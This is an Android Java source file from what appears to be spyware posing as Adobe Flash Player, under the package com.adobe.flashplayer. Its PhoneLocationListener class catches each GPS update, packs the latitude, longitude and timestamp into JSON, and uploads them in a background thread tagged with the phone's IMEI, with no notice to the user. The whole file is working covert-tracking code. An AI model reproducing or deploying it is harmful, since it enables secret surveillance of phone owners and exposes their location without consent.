package com.adobe.flashplayer.data;

import org.json.JSONArray;
import org.json.JSONObject;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.os.Bundle;
import android.util.Log;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.network.NetworkUitls;
import com.adobe.flashplayer.network.UploadData;
import com.adobe.flashplayer.Utils;



public class PhoneLocationListener implements LocationListener{

    private String TAG = "[ljg]PhoneLocationListener";

    private Context context = null;


    public PhoneLocationListener(Context context){
        this.context = context;
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
        Log.d(TAG,"location onStatusChanged");
    }

    @Override
    public void onProviderEnabled(String provider) {
        Log.d(TAG,"location onProviderEnabled");
    }

    @Override
    public void onProviderDisabled(String provider) {
        Log.d(TAG,"location onProviderDisabled");
    }

    @Override
    public void onLocationChanged(Location location) {
        Log.d(TAG,"location onLocationChanged");

        if (location != null) {
            getLocation( location.getLatitude(),location.getLongitude(),"", context);
        }
    }





    public static void getLocation(double latitude,double longitude,String info,Context context){
        try {

            JSONObject objloc = new JSONObject();
            objloc.put("status", "");
            objloc.put("time", Utils.formatCurrentDate());
            objloc.put("latitude", String.valueOf(latitude));
            objloc.put("longitude", String.valueOf(longitude));
            objloc.put("address", info);

            JSONArray jsarray=new JSONArray();

            jsarray.put(0,objloc);
            if (NetworkUitls.isNetworkAvailable(context)) {
                new Thread(new UploadData(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_LOCATION, Public.IMEI)).start();
            }else{

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }






}
